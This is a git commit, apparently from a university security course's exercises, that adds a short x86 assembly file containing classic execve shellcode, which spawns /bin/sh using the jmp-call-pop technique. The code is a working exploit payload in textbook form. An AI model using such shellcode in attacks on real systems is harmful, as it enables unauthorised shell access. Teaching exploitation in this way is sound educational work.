359ace84473ddd1b8a608158788aa4f975c9b9bf
vaioco <valerio.costamagna@di.unito.it>
2015-12-13 12:40:00 -0800

    shellcode esempi

---
+++ esercizi/shellcode/execve.asm
@@ -0,0 +1,28 @@
+Section .text
+	global cstart
+	global shellcode
+	global GotoCall
+	global cend:
+
+cstart:
+	jmp short	GotoCall
+
+shellcode:
+
+	pop esi
+	xor eax,eax
+	mov byte	[esi+7], al
+	lea ebx, [esi]
+	mov long 	[esi+8], ebx
+	mov long 	[esi+12], eax
+	mov byte al,0xb
+	mov ebx, esi
+	lea ecx, [esi+8]
+	lea edx, [esi+12]
+	int 0x80
+
+GotoCall:
+
+	call shellcode
+	db '/bin/shJAAAAKKKK'
+cend:
